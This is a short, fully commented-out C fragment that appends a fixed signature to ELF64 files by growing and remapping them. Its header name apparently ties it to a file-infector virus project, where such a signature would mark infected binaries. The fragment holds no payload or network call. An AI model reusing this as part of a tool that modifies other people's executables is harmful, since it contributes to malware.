// #include "famine.h"

// #include <stdint.h> // uintX_t
// #include <string.h> // memcpy()
// #include <unistd.h> // ftruncate()

// int sign_elf64_append(t_file *file)
// {
// 	uint64_t old_size, new_size;

// 	old_size = file->size;
// 	new_size = old_size + SIGNATURE_SIZE;

// 	if (unmap_file(file))
// 		return (1);

// 	if (ftruncate(file->fd, new_size) < 0) {
// 		map_file(file); // Best effort
// 		return (1);
// 	}

// 	file->size = new_size;

// 	if (map_file(file)) {
// 		file->size = old_size;
// 		map_file(file); // Best effort
// 		return (1);
// 	}

// 	memcpy(file->map + old_size, SIGNATURE, SIGNATURE_SIZE);
// 	return (0);
// }
